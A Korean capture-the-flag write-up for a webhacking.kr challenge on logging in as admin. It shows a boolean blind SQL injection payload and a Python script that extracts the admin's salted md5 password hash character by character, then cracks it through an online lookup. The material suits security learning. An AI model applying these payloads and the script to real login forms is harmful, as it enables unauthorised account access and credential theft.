# admin으로 로그인하기

로그인 폼이 있다. 
일단 회원가입을 하고, 로그인을 하면 hash key가 주어진다. 

md5 알고리즘 해시값이 나온다. 
이걸 dehash해보았다. 
https://crackstation.net/

비밀번호가 `pass` 였는데, `passapple` 이 해시되어 password hash가 만들어졌다. 

그러니까 **'받은 비번+apple'**를 md5 알고리즘으로 암호화하여 저장하는 것이다. 

***

admin으로 로그인을 하기 위해서는 비번을 알아야한다. 
그리고 비번은 md5로 해시된 형태가 DB에 저장이 된다. 

DB에 있는 admin의 해시된 비번값을 알아내기 위해서는 SQL injection 취약점을 이용해야한다. 

먼저 그냥 admin, anything을 넣어서 로그인을 시도하면, 'Login fail' 문구가 뜬다. 
하지만, 아래와 같은 SQL payload를 넣으면...

```
admin' and 1#
```

'Wrong password!' 라고 표시된다. 
그러니까 

```
admin' and <여기>#
```

 <여기>에 넣은 SQL문의 참거짓을 판별할 수 있다는 것. (참=> 'Wrong password!', 거짓=>'Login fail')
테이블에서 칼럼명이 id, pw라고 문제에 주어져 있기에, 

먼저 pw의 길이를 알아내고, 각 자리의 값을 알아내서 합치면 된다. 

**md5 알고리즘은 무제한의 메시지를 받아서 32개의 16진수 시퀸스를 출력한다.**

길이는 32라는 것을 알 수 있으니.. 각 자리의 문자가 뭔지를 알아내야한다. 
32문자열을 순회하면서, 각 문자를 0~9+

```mssql
substr(str, pos, len)
# str에서 pos 번째 위치에서 len 개의 문자를 읽어 들인다.
```

```python
import requests

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url="https://webhacking.kr/challenge/bonus-2/index.php"

data = {}
hx = [hex(i)[2:] for i in range(16)]
pw = ''
for i in range(32):
    for j in range(16):
        data['uuid']=f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}"
        res = requests.post(url, data=data, cookies=cookies)
        if res.text.find('Wrong password!') > 0:
            pw += hx[j]
            print(pw)
            break
print(f'password hash: {pw}')

>> # password hash: 6c9ca386a903921d7fa230ffa0ffc153

# 위에 f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}" #' 
# 여기서 '{hx[j]}' 주위에 콜론을 꼭 붙여줘야 문자로 인식함. 이걸 몰라서 난.. 또 삽질을 한참했지..
```

구한 password hash를 md5 dehash사이트에 넣어서 값을 구한다.

복호화한 password는 **wowapple**
admin의 비번은 `wow`다.

> 보통 DB에 비번이 저장될때 그대로 저장을 안하고, 해시함수로 암호화해서 저장한다. 
>
> 그래서 SQLi를 통해서 해시값을 알아내도 암호화되어 있기에 원래값을 알 수 없.. 어야 하지만, 
> md5처럼 오래된 알고리즘은 이미 복호화를 위한 데이터가 너무 많이 쌓여있다. 
> 그렇다보니 이번문제처럼 apple같은 salt를 넣어도 암호화가 아닌, encoding을 한 것처럼 금방 복호화가 되어버린다. 
>
> SQLi을 할때는 md5가 32자리라는 것을 이용해서 길이는 따로 구할 거 없이, 바로 한 문자씩 찾아내는 방법을 이용하였다. 
>
> SQLi 으로 화면변화에 따라서 한 문자씩 비번을 알아내는 방법 + md5 암호화의 의미없음을 알게된 문제였다. 